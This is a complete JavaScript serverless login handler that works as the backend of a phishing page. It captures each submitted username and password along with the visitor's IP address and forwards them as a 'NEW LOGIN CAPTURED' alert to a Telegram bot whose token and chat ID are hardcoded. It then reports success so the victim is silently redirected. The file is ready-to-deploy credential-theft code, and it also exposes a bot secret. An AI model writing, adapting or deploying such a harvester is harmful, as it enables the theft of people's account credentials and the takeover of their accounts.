// File: /api/login.js (Final Version with your credentials)

// 1. Your actual Token and Chat ID have been placed here.
const TELEGRAM_BOT_TOKEN = '8233346929:AAFcILwtpZydDM9u9Fcb3gQhLl8AprzFcQk';
const TELEGRAM_CHAT_ID = '6402487270';

export default async function handler(req, res) {
  // Only process POST requests
  if (req.method === 'POST') {
    // Get username, password, and IP address from the request
    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // 2. Format a clear and organized message
    const message = `
    *🚨 NEW LOGIN CAPTURED 🚨*
    --------------------------------------
    *👤 Username:* \`${username}\`
    *🔑 Password:* \`${password}\`
    *💻 IP Address:* \`${ip}\`
    *⏰ Timestamp:* \`${new Date().toUTCString()}\`
    --------------------------------------
    `;

    // 3. Prepare to send the message to the Telegram API
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
      await fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2' // Use Markdown for nice formatting (bold, code blocks )
        }),
      });
    } catch (error) {
      // If sending to Telegram fails, log the error on Vercel instead
      console.error("Failed to send message to Telegram:", error);
    }

    // 4. Respond to the frontend to allow the redirect to happen
    res.status(200).json({ success: true });
  } else {
    // If the request method is not POST, reject it
    res.status(405).send('Method Not Allowed');
  }
}
